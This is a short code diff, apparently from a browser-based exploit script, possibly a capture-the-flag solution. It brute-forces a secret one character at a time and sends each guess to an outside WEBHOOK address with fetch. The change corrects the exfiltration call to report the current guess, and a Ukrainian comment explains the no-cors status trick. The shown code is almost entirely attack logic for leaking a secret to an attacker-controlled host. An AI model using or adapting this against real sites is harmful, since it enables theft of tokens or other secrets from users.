@@ -30,7 +30,7 @@
             for (let i = 0; i < 8; i++) {
                 for (let char of ALPHABET) {
                     let attempt = secret + char;
-					fetch(`${WEBHOOK}?try=${secret}`);
+					fetch(`${WEBHOOK}?try=${attempt}`);
                     // Ми використовуємо fetch з mode: no-cors, щоб просто отримати статус
                     const controller = new AbortController();
                     const timeoutId = setTimeout(() => controller.abort(), 1000);
